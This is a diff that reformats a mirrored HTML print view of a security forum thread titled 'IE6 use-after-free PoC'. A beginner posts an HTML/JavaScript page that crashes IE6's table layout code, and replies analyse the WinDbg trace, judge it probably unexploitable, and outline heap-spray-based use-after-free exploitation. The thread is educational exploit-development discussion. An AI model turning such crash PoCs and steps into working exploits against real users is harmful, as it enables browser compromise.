@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=3416&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:22 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=3416&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:22 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> IE6 use-after-free PoC</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -35,24 +32,24 @@
 	<div class="floatcontainer">
 		<a class="maxperpage" href="printthread680e.html?t=3416&amp;pp=40">Show 40 post(s) from this thread on one page</a>
 		<div id="pagination_top">
-			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=3416&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
-<input type="hidden" name="t" value="3416" /><input type="hidden" name="pp" value="10" />
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=3416&amp;pp=10&amp;page=2" class="pagination popupmenu nohovermenu" method="get">
+<input name="t" type="hidden" value="3416"/><input name="pp" type="hidden" value="10"/>
 	
-		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		<span><a class="popupctrl" href="javascript://">Page 1 of 2</a></span>
 		
 		
 		
 		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 12">1</a></span><span><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Show results 11 to 12 of 12">2</a></span>
 		
 		
-		<span class="prev_next"><a rel="next" href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 12 of 12"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		<span class="prev_next"><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" rel="next" title="Next Page - Results 11 to 12 of 12"><img alt="Next" src="images/pagination/next-right.png"/></a></span>
 		
 		
-		<span class="first_last"><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 12 of 12">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		<span class="first_last"><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 12 of 12">Last<img alt="Last" src="images/pagination/last-right.png"/></a></span>
 		
 	
 	<ul class="popupbody popuphover">
-		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+		<li class="formsubmit jumptopage"><label>Jump to page: <input name="page" size="4" type="text"/></label> <input class="button" type="submit" value="Go"/></li>
 	</ul>
 </form>
 		</div>
@@ -70,40 +67,40 @@
 		<div class="title">IE6 use-after-free PoC</div>
 	
 	<div class="content">
-		<blockquote class="restore">Hi :)<br />
-<br />
-I've just recently started looking into exploit development. I have this PoC that crashes IE6 &amp; according to windbg, is exploitable. But am kinda having a hard time figuring out how to over-write the data of the vftable pointer. Or maybe theres a better approach? Any *pointers*? :)<br />
-<br />
+		<blockquote class="restore">Hi :)<br/>
+<br/>
+I've just recently started looking into exploit development. I have this PoC that crashes IE6 &amp; according to windbg, is exploitable. But am kinda having a hard time figuring out how to over-write the data of the vftable pointer. Or maybe theres a better approach? Any *pointers*? :)<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code"><br />
-&lt;HTML&gt;<br />
-&lt;HEAD&gt;<br />
-&lt;SCRIPT type=&quot;text/JavaScript&quot;&gt;<br />
-function initall() {<br />
-var tableElem = document.body.firstChild;<br />
-if(tableElem.childNodes.length &gt; 0) {<br />
-tableElem.removeChild(tableElem.firstChild);<br />
-}<br />
-&nbsp;<br />
-var targetBody = document.createElement('TBODY');<br />
-tableElem.appendChild(targetBody);<br />
-&nbsp;<br />
-var sampleRow = document.createElement('TR');<br />
-var cell = document.createElement('TD');<br />
-for(var i = 0; i &lt; 8; i++) {<br />
-sampleRow.appendChild(cell.cloneNode());<br />
-}<br />
-targetBody.appendChild(sampleRow);<br />
-&nbsp;<br />
-setTimeout(initall, 1);<br />
-};<br />
-&lt;/SCRIPT&gt;<br />
-&lt;/HEAD&gt;<br />
-&lt;BODY onload=&quot;initall();&quot;&gt;<br />
-&lt;TABLE&gt;&lt;TBODY&gt;&lt;/TBODY&gt;&lt;/TABLE&gt;<br />
-&lt;/BODY&gt;<br />
-&lt;/HTML&gt;</code><hr />
+	<hr/><code class="bbcode_code"><br/>
+&lt;HTML&gt;<br/>
+&lt;HEAD&gt;<br/>
+&lt;SCRIPT type="text/JavaScript"&gt;<br/>
+function initall() {<br/>
+var tableElem = document.body.firstChild;<br/>
+if(tableElem.childNodes.length &gt; 0) {<br/>
+tableElem.removeChild(tableElem.firstChild);<br/>
+}<br/>
+ <br/>
+var targetBody = document.createElement('TBODY');<br/>
+tableElem.appendChild(targetBody);<br/>
+ <br/>
+var sampleRow = document.createElement('TR');<br/>
+var cell = document.createElement('TD');<br/>
+for(var i = 0; i &lt; 8; i++) {<br/>
+sampleRow.appendChild(cell.cloneNode());<br/>
+}<br/>
+targetBody.appendChild(sampleRow);<br/>
+ <br/>
+setTimeout(initall, 1);<br/>
+};<br/>
+&lt;/SCRIPT&gt;<br/>
+&lt;/HEAD&gt;<br/>
+&lt;BODY onload="initall();"&gt;<br/>
+&lt;TABLE&gt;&lt;TBODY&gt;&lt;/TBODY&gt;&lt;/TABLE&gt;<br/>
+&lt;/BODY&gt;<br/>
+&lt;/HTML&gt;</code><hr/>
 </div></blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -114,39 +111,39 @@ setTimeout(initall, 1);<br />
 	
 	
 	<div class="content">
-		<blockquote class="restore">Crash occurs at <br />
-<br />
-<i>mshtml!CTableLayout::ReleaseRowsAndSections+0xa7:<br />
-7d67ec9d 897a20          mov     dword ptr [edx+20h],edi ds:0023:018002a0=????????<br />
-<br />
-Stack Trace<br />
-<br />
-0:000&gt; k<br />
-<br />
-ChildEBP RetAddr  <br />
-0013d0f0 7d67f184 mshtml!CTableLayout::ReleaseRowsAndSections+0xa7<br />
-0013d108 7d67f22a mshtml!CTableLayout::ClearTableLayoutCache+0x25<br />
-0013d118 7d67f2e3 mshtml!CTableLayout::FlushGrid+0x31<br />
-0013d158 7d5a93d9 mshtml!CTableLayout::CreateTableLayoutCache+0x42<br />
-0013d160 7d544cc4 mshtml!CTableLayout::EnsureTableLayoutCache+0x29<br />
-0013d2a0 7d5069d1 mshtml!CTableLayout::CalcSizeVirtual+0x107</i><br />
-<br />
-<br />
-Reading from the source code of mshtml.dll from <a href="../external.html?link=http://read.pudn.com/downloads3/sourcecode/windows/248345/win2k/private/inet/mshtml/src/site/table/ltable.cxx__.htm" target="_blank">win2ksrc.rar ltable.cxx</a>, we can determine the place where the crash takes place<br />
-<br />
-<i><span style="font-family: Courier New">for (ppSection = _aryBodys, iSection = _aryBodys.Size(); <br />
-         iSection &gt; 0; <br />
-         iSection--, ppSection++) <br />
-    { <br />
-        (*ppSection)-&gt;_iRow = 0;  &lt;&lt; crash happens here<br />
-		<br />
-        (*ppSection)-&gt;_cRows = 0; <br />
-    } </span></i><br />
-	<br />
-and at this place both edi always is zero and edx can not be controlled <br />
-<br />
- mov     dword ptr [edx+20h],edi ds:0023:018002a0=????????<br />
- <br />
+		<blockquote class="restore">Crash occurs at <br/>
+<br/>
+<i>mshtml!CTableLayout::ReleaseRowsAndSections+0xa7:<br/>
+7d67ec9d 897a20          mov     dword ptr [edx+20h],edi ds:0023:018002a0=????????<br/>
+<br/>
+Stack Trace<br/>
+<br/>
+0:000&gt; k<br/>
+<br/>
+ChildEBP RetAddr  <br/>
+0013d0f0 7d67f184 mshtml!CTableLayout::ReleaseRowsAndSections+0xa7<br/>
+0013d108 7d67f22a mshtml!CTableLayout::ClearTableLayoutCache+0x25<br/>
+0013d118 7d67f2e3 mshtml!CTableLayout::FlushGrid+0x31<br/>
+0013d158 7d5a93d9 mshtml!CTableLayout::CreateTableLayoutCache+0x42<br/>
+0013d160 7d544cc4 mshtml!CTableLayout::EnsureTableLayoutCache+0x29<br/>
+0013d2a0 7d5069d1 mshtml!CTableLayout::CalcSizeVirtual+0x107</i><br/>
+<br/>
+<br/>
+Reading from the source code of mshtml.dll from <a href="../external.html?link=http://read.pudn.com/downloads3/sourcecode/windows/248345/win2k/private/inet/mshtml/src/site/table/ltable.cxx__.htm" target="_blank">win2ksrc.rar ltable.cxx</a>, we can determine the place where the crash takes place<br/>
+<br/>
+<i><span style="font-family: Courier New">for (ppSection = _aryBodys, iSection = _aryBodys.Size(); <br/>
+         iSection &gt; 0; <br/>
+         iSection--, ppSection++) <br/>
+    { <br/>
+        (*ppSection)-&gt;_iRow = 0;  &lt;&lt; crash happens here<br/>
+		<br/>
+        (*ppSection)-&gt;_cRows = 0; <br/>
+    } </span></i><br/>
+	<br/>
+and at this place both edi always is zero and edx can not be controlled <br/>
+<br/>
+ mov     dword ptr [edx+20h],edi ds:0023:018002a0=????????<br/>
+ <br/>
  PS: i Dont think its an exploitable crash!</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_3">
@@ -157,40 +154,40 @@ and at this place both edi always is zero and edx can not be controlled <br />
 	
 	
 	<div class="content">
-		<blockquote class="restore">sweet!<br />
-<br />
-Never knew about the online source-code thingy ;)<br />
-<br />
+		<blockquote class="restore">sweet!<br/>
+<br/>
+Never knew about the online source-code thingy ;)<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Quote:</div>
 	<div class="bbcode_quote printable">
-		<hr />
+		<hr/>
 		
-			and at this place both edi always is zero and edx can not be controlled <br />
-<br />
-mov dword ptr [edx+20h],edi ds:0023:018002a0=????????<br />
-<br />
+			and at this place both edi always is zero and edx can not be controlled <br/>
+<br/>
+mov dword ptr [edx+20h],edi ds:0023:018002a0=????????<br/>
+<br/>
 PS: i Dont think its an exploitable crash!
 			
-		<hr />
+		<hr/>
 	</div>
-</div><br />
-<br />
-Thats what I thought too. So you mean to say, there has to be a way for us to control either of those registers or we can't exploit it? Now whats the whole business with heapsprays?<br />
-From what I understand, the above PoC crashes because that location was already freed. Isn't this how the usual use-after-free exploitation is done:<br />
-<br />
-<br />
+</div><br/>
+<br/>
+Thats what I thought too. So you mean to say, there has to be a way for us to control either of those registers or we can't exploit it? Now whats the whole business with heapsprays?<br/>
+From what I understand, the above PoC crashes because that location was already freed. Isn't this how the usual use-after-free exploitation is done:<br/>
+<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Quote:</div>
 	<div class="bbcode_quote printable">
-		<hr />
+		<hr/>
 		
-			1. Initialize a variable/array on the heap.<br />
-2. Nullify an existing (different) tag/pointer.<br />
-3. Fill the array initialized at step-1 again,hoping this'll end up overwriting the vftable's pointer we just freed in step-2. (Provided the size of the data was the same? Dunno how this works yet)<br />
+			1. Initialize a variable/array on the heap.<br/>
+2. Nullify an existing (different) tag/pointer.<br/>
+3. Fill the array initialized at step-1 again,hoping this'll end up overwriting the vftable's pointer we just freed in step-2. (Provided the size of the data was the same? Dunno how this works yet)<br/>
 4. Try to use the tag/pointer in step-2 &amp; Bingo?
 			
-		<hr />
+		<hr/>
 	</div>
 </div></blockquote>
 	</div>
@@ -202,30 +199,30 @@ From what I understand, the above PoC crashes because that location was already 
 	
 	
 	<div class="content">
-		<blockquote class="restore">Hey bro!<br />
-<br />
+		<blockquote class="restore">Hey bro!<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Quote:</div>
 	<div class="bbcode_quote printable">
-		<hr />
+		<hr/>
 		
-			&quot;Now whats the whole business with heapsprays&quot;
+			"Now whats the whole business with heapsprays"
 			
-		<hr />
+		<hr/>
 	</div>
-</div>Only memory layout can be controlled with heap sprays not registers!<br />
-<br />
+</div>Only memory layout can be controlled with heap sprays not registers!<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Quote:</div>
 	<div class="bbcode_quote printable">
-		<hr />
+		<hr/>
 		
 			From what I understand, the above PoC crashes because that location was already freed
 			
-		<hr />
+		<hr/>
 	</div>
-</div>The location was never allocated ! we  can verify that from the dbg output &quot;0023:018002a0=????????&quot;<br />
-<br />
+</div>The location was never allocated ! we  can verify that from the dbg output "0023:018002a0=????????"<br/>
+<br/>
 Thanks!</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_5">
@@ -236,7 +233,7 @@ Thanks!</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore">Now things are making sense. One more thing, Lets say one finds a &quot;use-after-free&quot; vulnerability. Whats the usual approach to proceed further?</blockquote>
+		<blockquote class="restore">Now things are making sense. One more thing, Lets say one finds a "use-after-free" vulnerability. Whats the usual approach to proceed further?</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_6">
 	<div class="header">
@@ -246,7 +243,7 @@ Thanks!</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore"><a href="../external.html?link=http://www.garage4hackers.com/blogs/3489/reliable-php-exploitation-windows-xp-windows-7-578/" target="_blank">Reliable PHP Exploitation from Windows XP to Windows 7 - Blogs - Garage4hackers Forum</a>     #heap spraying <br />
+		<blockquote class="restore"><a href="../external.html?link=http://www.garage4hackers.com/blogs/3489/reliable-php-exploitation-windows-xp-windows-7-578/" target="_blank">Reliable PHP Exploitation from Windows XP to Windows 7 - Blogs - Garage4hackers Forum</a>     #heap spraying <br/>
 :)</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_7">
@@ -257,13 +254,13 @@ Thanks!</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore">use after free vulnerabilities notmally exploited in this way for browsers atleast <br />
-<br />
-<br />
-Create element -&gt; delete that element(here memory is freed bu reference is kept (This is the problem)) -&gt; Heap Spray(so that the memory occupied and freed in last step by element is now filled with your spayed data) -&gt; try to access the same element which was deleted in 2nd step (so as the memory is controlled by you will be accessed as the reference was not deleted)<br />
-<br />
-in very simple way:<br />
-<br />
+		<blockquote class="restore">use after free vulnerabilities notmally exploited in this way for browsers atleast <br/>
+<br/>
+<br/>
+Create element -&gt; delete that element(here memory is freed bu reference is kept (This is the problem)) -&gt; Heap Spray(so that the memory occupied and freed in last step by element is now filled with your spayed data) -&gt; try to access the same element which was deleted in 2nd step (so as the memory is controlled by you will be accessed as the reference was not deleted)<br/>
+<br/>
+in very simple way:<br/>
+<br/>
 create Element -&gt; delete element -&gt; heap spray -&gt; access deleted element</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_8">
@@ -274,7 +271,7 @@ create Element -&gt; delete element -&gt; heap spray -&gt; access deleted elemen
 	
 	
 	<div class="content">
-		<blockquote class="restore">Got the concept :) Thanks.<br />
+		<blockquote class="restore">Got the concept :) Thanks.<br/>
 Now its time to test my theories ;)</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_9">
@@ -285,10 +282,10 @@ Now its time to test my theories ;)</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore">one of the best utilities which can be used for use after free vulnerability analysis is<br />
-gflags.exe (windbg)<br />
-<br />
-one of the good article.<br />
+		<blockquote class="restore">one of the best utilities which can be used for use after free vulnerability analysis is<br/>
+gflags.exe (windbg)<br/>
+<br/>
+one of the good article.<br/>
 <a href="../external.html?link=http://www.devproconnections.com/article/net-framework2/Debug-Heap-Issues-with-Full-Page-Heap-129771" target="_blank">Debug Heap Issues Using Full Page Heap</a></blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_10">
@@ -299,10 +296,10 @@ one of the good article.<br />
 	
 	
 	<div class="content">
-		<blockquote class="restore">I found that using exploitable! from Microsoft gave in many cases indication and a good estimate on how exploitable is a vulnerability.<br />
-<br />
-Try to use it, its pretty straight forward if you already have windbg running - <a href="../external.html?link=http://msecdbg.codeplex.com/" target="_blank">&amp;#33;exploitable Crash Analyzer - MSEC Debugger Extensions - Home</a><br />
-<br />
+		<blockquote class="restore">I found that using exploitable! from Microsoft gave in many cases indication and a good estimate on how exploitable is a vulnerability.<br/>
+<br/>
+Try to use it, its pretty straight forward if you already have windbg running - <a href="../external.html?link=http://msecdbg.codeplex.com/" target="_blank">&amp;#33;exploitable Crash Analyzer - MSEC Debugger Extensions - Home</a><br/>
+<br/>
 If you cannot get it to work, let me know, I can help you with it</blockquote>
 	</div>
 </li>
@@ -312,24 +309,24 @@ If you cannot get it to work, let me know, I can help you with it</blockquote>
 	<div class="floatcontainer">
 		<a class="maxperpage" href="printthread680e.html?t=3416&amp;pp=40">Show 40 post(s) from this thread on one page</a>
 		<div id="pagination_bottom">
-			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=3416&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
-<input type="hidden" name="t" value="3416" /><input type="hidden" name="pp" value="10" />
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=3416&amp;pp=10&amp;page=2" class="pagination popupmenu nohovermenu" method="get">
+<input name="t" type="hidden" value="3416"/><input name="pp" type="hidden" value="10"/>
 	
-		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		<span><a class="popupctrl" href="javascript://">Page 1 of 2</a></span>
 		
 		
 		
 		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 12">1</a></span><span><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Show results 11 to 12 of 12">2</a></span>
 		
 		
-		<span class="prev_next"><a rel="next" href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 12 of 12"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		<span class="prev_next"><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" rel="next" title="Next Page - Results 11 to 12 of 12"><img alt="Next" src="images/pagination/next-right.png"/></a></span>
 		
 		
-		<span class="first_last"><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 12 of 12">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		<span class="first_last"><a href="printthreadbe78.html?t=3416&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 12 of 12">Last<img alt="Last" src="images/pagination/last-right.png"/></a></span>
 		
 	
 	<ul class="popupbody popuphover">
-		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+		<li class="formsubmit jumptopage"><label>Jump to page: <input name="page" size="4" type="text"/></label> <input class="button" type="submit" value="Go"/></li>
 	</ul>
 </form>
 		</div>
@@ -337,14 +334,14 @@ If you cannot get it to work, let me know, I can help you with it</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:50 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:50 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -362,7 +359,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=3416&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:23 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=3416&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:27:23 GMT --></html>
